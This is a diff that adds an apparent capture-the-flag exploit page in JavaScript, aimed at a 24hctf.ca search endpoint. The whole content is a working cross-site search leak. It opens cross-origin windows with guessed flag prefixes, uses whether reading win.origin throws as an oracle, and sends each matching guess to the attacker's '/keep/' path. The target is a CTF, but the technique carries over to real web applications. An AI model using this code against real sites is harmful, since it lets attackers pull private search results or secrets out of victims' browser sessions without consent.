@@ -1,0 +1,30 @@
+var url = 'http://yogosha.24hctf.ca/search?query=';
+var flag = "FLAG{ShOrtAf}";
+
+var ALPHA = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
+for (var i = 0 ; i < ALPHA.length ; i++) {
+        // Get a window reference
+        let c = ALPHA[i];
+        var win = window.open(url + flag + c);
+
+        function foo(w, x) {
+                return (() => {
+                        try {
+                                // If a navigation occurs, the iframe will be cross-origin,
+                                // so accessing "win.origin" will throw an exception
+                                w.origin;
+                                window.open("/keep/" + flag + x);
+                                parent.console.log('Download attempt detected');
+                        } catch(e) {
+                                parent.console.log('No download attempt detected');
+                        }
+                });
+        }
+
+        // Wait for the window to load.
+        setTimeout(foo(win, c), 2000);
+}
+
+
+</script></body></html>
